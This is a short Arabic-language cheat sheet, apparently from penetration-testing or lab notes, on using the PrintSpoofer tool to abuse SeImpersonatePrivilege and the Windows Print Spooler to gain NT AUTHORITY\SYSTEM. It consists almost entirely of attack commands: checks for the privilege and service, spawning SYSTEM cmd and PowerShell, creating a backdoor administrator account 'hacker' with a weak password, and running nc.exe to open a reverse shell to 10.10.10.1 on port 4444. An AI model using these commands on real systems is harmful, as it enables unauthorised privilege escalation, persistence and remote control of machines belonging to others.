الأداة تستغل:

> **SeImpersonatePrivilege** للحصول على صلاحيات

NT AUTHORITY\SYSTEM

عن طريق خداع خدمة الطباعة (Print Spooler)

---

# قبل الاستخدام (Checklist مهم)

## 1. تحقق من الامتياز

whoami /priv

لازم تشوف:

SeImpersonatePrivilege    Enabled

---

## 2. تأكد أن خدمة الطباعة شغالة

sc query spooler

إذا:

STATE : RUNNING

✔ جاهز

---

# الاستخدام الأساسي

## فتح CMD بصلاحيات SYSTEM

PrintSpoofer.exe -i -c cmd

---

## ماذا تعني الخيارات؟

|الخيار|المعنى|
|---|---|
|`-i`|Interactive (يفتح لك shell)|
|`-c`|الأمر الذي سيتم تشغيله|

---

# أمثلة عملية

## 1. PowerShell كـ SYSTEM

PrintSpoofer.exe -i -c powershell

---

## 2. إضافة مستخدم أدمن

PrintSpoofer.exe -i -c "net user hacker 123456 /add"  
PrintSpoofer.exe -i -c "net localgroup administrators hacker /add"

---

## 3. تشغيل ملف

PrintSpoofer.exe -i -c "C:\tools\nc.exe 10.10.10.1 4444 -e cmd"